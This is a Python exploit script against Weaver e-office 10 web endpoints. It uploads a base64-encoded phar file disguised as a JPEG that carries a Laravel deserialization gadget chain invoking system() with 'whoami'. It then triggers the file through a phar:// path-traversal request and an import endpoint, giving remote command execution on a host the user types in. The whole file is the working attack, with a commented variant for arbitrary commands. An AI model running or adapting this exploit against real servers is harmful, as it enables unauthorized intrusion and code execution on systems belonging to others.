import requests
import json
import base64
import random
import string

def generate_random_string(length):
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

def reqtext(iport,url,UA,mod,body=None,command=None):
    headers = {
        "Host": iport,
        "User-Agent": UA,
        "Accept": "*/*",
        "Accept-Encoding": "gzip, deflate",
        "Content-Type": "application/x-www-form-urlencoded"
        }
    if mod == 1:
        random_string = generate_random_string(10)
        boundary = random_string
        headers["Content-Type"] = f"multipart/form-data; boundary={boundary}"
        # strlen = len(command)
        # payload = f'GIF89a<?php __HALT_COMPILER(); ?>\r\n+\x01\x00\x00\x01\x00\x00\x00\x11\x00\x00\x00\x01\x00\x00\x00\x00\x00\xf5\x00\x00\x00O:40:"Illuminate\\Broadcasting\\PendingBroadcast":2:{{s:9:"\x00*\x00events";O:25:"Illuminate\\Bus\\Dispatcher":1:{{s:16:"\x00*\x00queueResolver";s:6:"system";}}s:8:"\x00*\x00event";O:38:"Illuminate\\Broadcasting\\BroadcastEvent":1:{{s:10:"connection";s:{strlen}:"{command}";}}\x08\x00\x00\x00test.txt\x04\x00\x00\x00E\xaa\x05f\x04\x00\x00\x00\x0c~\x7f\xd8\xb6\x01\x00\x00\x00\x00\x00\x00testhd\x0f\xc0M\x1dO\xf4\xc8\xd9\x11\x86\xb9:$\xfa\xd9#\xd1B\x02\x00\x00\x00GBMB'.encode('utf-8')
        a = "PD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8+DQp9AQAAAQAAABEAAAABAAAAAABHAQAATzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MjU6IklsbHVtaW5hdGVcQnVzXERpc3BhdGNoZXIiOjU6e3M6MTI6IgAqAGNvbnRhaW5lciI7TjtzOjExOiIAKgBwaXBlbGluZSI7TjtzOjg6IgAqAHBpcGVzIjthOjA6e31zOjExOiIAKgBoYW5kbGVycyI7YTowOnt9czoxNjoiACoAcXVldWVSZXNvbHZlciI7czo2OiJzeXN0ZW0iO31zOjg6IgAqAGV2ZW50IjtPOjM4OiJJbGx1bWluYXRlXEJyb2FkY2FzdGluZ1xCcm9hZGNhc3RFdmVudCI6MTp7czoxMDoiY29ubmVjdGlvbiI7czo2OiJ3aG9hbWkiO319CAAAAHRlc3QudHh0BAAAAAAAAAAEAAAADH5/2KQBAAAAAAAAdGVzdHRSzZ81KOSsetALAF4p3rv3Y5NrAgAAAEdCTUI="
        payload = base64.b64decode(a)
        body = f"--{boundary}\r\nContent-Disposition: form-data; name=\"Filedata\"; filename=\"register.inc\"\r\nContent-Type: image/jpeg\r\n\r\n".encode('utf-8') + payload + f"\r\n--{boundary}--\r\n".encode('utf-8')
        headers["Content-Length"] = str(len(body))
        re = req(iport+url, headers, body)
        parsed_data = json.loads(re)
        try:
            attachment_id = parsed_data['data']['attachment_id']
            return attachment_id
        except Exception as e:
            print("no search vuln")
            exit(0)
    if mod == 2:
        headers["Content-Length"] = str(len(body))
        re = req(iport+url, headers, body)
        return re

def req(iu,headers,body):
    response = requests.post("http://"+iu, headers=headers, data=body, verify=False, allow_redirects=True)
    return response.text

url0 = "/eoffice10/server/public/api/attachment/atuh-file"
url1 = "/eoffice10/server/public/api/attachment/path/migrate"
url2 = "/eoffice10/server/public/api/empower/import"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 flower/majyo-party"



if __name__=='__main__':

    iport = input("example:oa.xjbtedu.cn:8889\n"
                  "input:")
    # command = input("command:")
    attachment_id = reqtext(iport,url0,UA,1)
    print("attachment_id:"+attachment_id)
    body = "source_path=&desc_path=phar://../../../../attachment/"
    status = reqtext(iport, url1, UA, 2 ,body)
    print(status)
    body = f"type=flower&file={attachment_id}"
    req = reqtext(iport, url2, UA, 2, body)
    print(req)

